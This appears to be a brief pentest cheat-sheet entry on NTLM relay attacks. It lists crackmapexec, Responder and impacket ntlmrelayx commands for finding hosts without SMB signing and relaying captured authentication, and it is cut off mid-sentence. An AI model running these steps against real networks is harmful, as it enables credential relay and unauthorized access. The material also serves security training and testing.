item.title: NTLM-Relay
item.description: NTLM-Relay Multi-Targets First gather all the ips that do not require smb signing crackmapexec smb 192.168.1.0/24 --gen-relay-list targets.txt Then edit responder configuration sudo vim /usr/share/responder/responder.conf Turn off the SMB and HTTP option, then run sudo responder -I ppp0 -v Once the responder is up, you can run ntlm relay attack using impacket tools ntlmrelayx.py -t 192.168.64.129 -smb2support ntlmrelayx.py -tf targets.txt -smb2support -i More about it : viperone blog fox-it NTLM-Relay One-Shot The hacker (192.
